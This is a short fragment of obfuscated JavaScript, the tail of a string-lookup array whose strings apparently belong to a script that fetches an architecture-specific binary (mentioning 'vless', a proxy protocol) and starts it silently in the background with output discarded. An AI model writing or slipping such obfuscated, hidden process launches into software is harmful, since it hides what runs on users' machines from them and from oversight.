0&','Skipping\x20adding\x20automatic\x20access\x20task','pipe','2087','vless','substring','arm','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','mkdirSync','application/json','error','\x20>/dev/null\x202>&1\x20&'];_0x2171=function(){return _0x103d0e;};return _0x2171();}
